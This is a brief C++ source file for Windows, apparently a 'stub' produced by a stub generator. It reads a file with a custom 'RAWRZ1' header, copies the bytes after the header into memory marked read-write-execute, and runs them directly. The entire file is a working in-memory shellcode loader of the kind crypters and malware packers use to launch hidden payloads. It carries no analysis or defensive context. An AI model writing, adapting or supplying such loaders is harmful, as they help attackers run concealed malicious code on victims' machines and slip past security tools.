#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

int main() {
    // Load RAWRZ file
    std::ifstream file("ultimate_stub-generator_rawrz1_1759684517814.rawrz", std::ios::binary);
    if (!file) {
        return 1;
    }
    
    // Read file content
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Skip RAWRZ1 header (6 bytes)
    if (buffer.size() < 6 || std::string(buffer.begin(), buffer.begin() + 6) != "RAWRZ1") {
        return 1;
    }
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, buffer.size() - 6, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem) {
        memcpy(execMem, buffer.data() + 6, buffer.size() - 6);
        ((void(*)())execMem)();
        VirtualFree(execMem, 0, MEM_RELEASE);
    }
    
    return 0;
}